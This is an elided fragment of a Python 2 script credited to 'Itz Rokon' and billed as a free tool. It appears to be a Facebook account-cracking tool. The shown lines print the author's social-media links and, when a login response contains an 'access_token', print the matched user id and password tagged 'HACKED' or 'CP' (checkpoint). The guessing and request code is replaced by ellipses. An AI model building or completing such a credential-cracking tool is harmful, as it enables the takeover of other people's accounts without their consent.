...
print("\033[0;91mThis Tool's Free By Itz Rokon")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : Itz Rokon'

    print '\033[0;94mFACEBOOK : https://www.facebook.com/ItZ.rokonuzzaman'

    print '\033[0;96mGITHUB   : rokon03'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Itz Rokon-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;91m[Rokon-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
